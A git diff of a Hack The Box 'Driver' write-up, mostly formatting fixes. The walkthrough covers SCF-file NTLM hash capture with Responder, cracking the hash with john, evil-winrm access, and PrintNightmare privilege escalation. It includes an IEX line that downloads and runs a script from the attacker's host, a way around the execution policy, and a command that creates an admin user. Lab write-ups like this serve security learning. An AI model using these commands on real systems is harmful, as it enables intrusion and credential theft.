@@ -8,9 +8,7 @@ categories:
 
 ## Enumeration
 
-### nmap
-
-```
+```bash
 PORT    STATE SERVICE      REASON  VERSION
 80/tcp  open  http         syn-ack Microsoft IIS httpd 10.0
 |_http-server-header: Microsoft-IIS/10.0
@@ -51,7 +49,7 @@ Basically a windows machine with a web server, visiting the website requires adm
 
 RPC open on port 135...lets do Rpc enumeration
 
-```
+```bash
 $rpcdump.py 10.10.11.106
 Impacket v0.9.25.dev1 - Copyright 2021 SecureAuth Corporation
 
@@ -77,7 +75,7 @@ Defaults creds work lol
 
 After login we see a printer
 
-In Firmware updates page we can uplaod files (upload Firmware)
+In Firmware updates page we can upload files (upload Firmware)
 
 As samba open those are probably saved in the shares
 
@@ -85,14 +83,14 @@ After some research (google) I discovered [SCF file attacks](https://pentestlab.
 
 we create an exploit named `@exploit.scf`
 
-we start a responder to capture hashes  
+we start a responder to capture hashes
 `sudo responder -wrf --lm -v -I tun0`
 
 I had issues with tun0 interface because of my network configuration, as I am on virtualbox (Nat network + vpn from guest)
 
 But eventually after clicking on submit button we get the following:
 
-```
+```bash
 [SMB] NTLMv2 Client : 10.10.11.106
 [SMB] NTLMv2 Username : DRIVER\tony
 [SMB] NTLMv2 Hash : tony::DRIVER:6f09da70e73b9237:674092FE6EC25CB23CBB01D554A9B854:0101000000000000DEB3B39E53B8D70144991278610991070000000002000400270027000000000000000000
@@ -100,7 +98,7 @@ But eventually after clicking on submit button we get the following:
 
 Crack the hash with john+rockyou
 
-```
+```bash
 Press 'q' or Ctrl-C to abort, almost any other key for status
 liltony (tony)
 1g 0:00:00:00 DONE (2021-10-03 00:42) 10.00g/s 327680p/s 327680c/s 327680C/s softball27..eatme1
@@ -108,10 +106,10 @@ liltony (tony)
 
 So creds are `tony : liltony`
 
-we connect with evil-winrm  
+we connect with evil-winrm
 `evil-winrm -i 10.10.11.106 -u tony -p liltony`
 
-USER FLAG  
+USER FLAG
 `_Evil-WinRM_ PS C:\Users\tony\Desktop> type user.txt`
 
 ## Privileges Escalation
@@ -123,40 +121,39 @@ we upload the file with evil-winrm
 
 But we cannot import it
 
-````
+```powershell
 File C:\Users\tony\Desktop\cve-2021-1675.ps1 cannot be loaded because running scripts is disabled on this system. For more information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID=135170.
 At line:1 char:1
 
 - Import-Module .\cve-2021-1675.ps1
-- ```
 
-  ```
+...
 
 - CategoryInfo : SecurityError: (:) [Import-Module], PSSecurityException
 - FullyQualifiedErrorId : UnauthorizedAccess,Microsoft.PowerShell.Commands.ImportModuleCommand
-````
+```
 
 we can bypass that with the help of download the file with help of `IEX` command
 
 we start a python server where the exploit is and download with IEX on evil-winrm
 
-```
+```powershell
 IEX(New-Object Net.Webclient).downloadstring('http://10.10.15.45:4444/CVE-2021-1675.ps1') //used port 4444 for server because 80 was busy (had another server)
 ```
 
 Then we invoke it and choose our creds
 
-```
+```powershell
 Invoke-Nightmare -NewUser "nairolf" -NewPassword "nairolf"
 
 [+] added user nairolf as local administrator
 [+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
 ```
 
-Now we are admin...lets connect as such  
+Now we are admin...lets connect as such
 `evil-winrm -i 10.10.11.106 -u nairolf -p nairolf`
 
-ROOT FLAG  
+ROOT FLAG
 `_Evil-WinRM_ PS C:\Users\Administrator\Desktop> type root.txt`
 
 This room was anything but easy...htb got a problem rating their boxes
